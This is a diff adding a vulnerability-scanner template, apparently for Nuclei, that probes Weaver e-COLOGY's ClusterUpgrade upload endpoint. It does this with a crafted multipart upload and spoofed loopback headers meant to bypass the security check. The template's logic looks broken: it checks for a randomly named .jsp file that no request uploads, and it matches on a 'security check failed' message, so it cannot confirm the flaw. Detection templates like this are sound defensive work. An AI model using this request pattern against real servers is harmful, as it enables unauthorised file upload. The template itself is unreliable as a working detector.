@@ -1,0 +1,46 @@
+id: weaver-ecology-clusterupgrade-file-upload
+
+info:
+  name: Weaver e-COLOGY ClusterUpgrade File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects a file upload vulnerability in Weaver e-COLOGY's ClusterUpgrade functionality. The issue allows bypassing security checks and uploading malicious files, potentially leading to arbitrary file write and execution.
+
+variables:
+  realNodeIP: "127.0.0.1"
+  filenameRandom: "{{rand_text_alpha(5)}}.jsp"
+  testContent: "just_for_test"
+
+http:
+  - raw: |
+      POST /clusterupgrade/uploadFileClient.jsp?token=test_token HTTP/1.1
+      Host: {{Hostname}}
+      RemoteIP: {{realNodeIP}}
+      x-forwarded-for: {{realNodeIP}}
+      Proxy-Client-IP: {{realNodeIP}}
+      WL-Proxy-Client-IP: {{realNodeIP}}
+      Content-Type: multipart/form-data; boundary=--------------------------boundary
+
+      ----------------------------boundary
+      Content-Disposition: form-data; name="file"; filename="weaver.zip"
+      Content-Type: application/zip
+
+      {{testContent}}
+      ----------------------------boundary--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "安全校验失败"
+
+  - raw: |
+      GET /versionupgrade/temp/{{filenameRandom}} HTTP/1.1
+      Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{testContent}}"
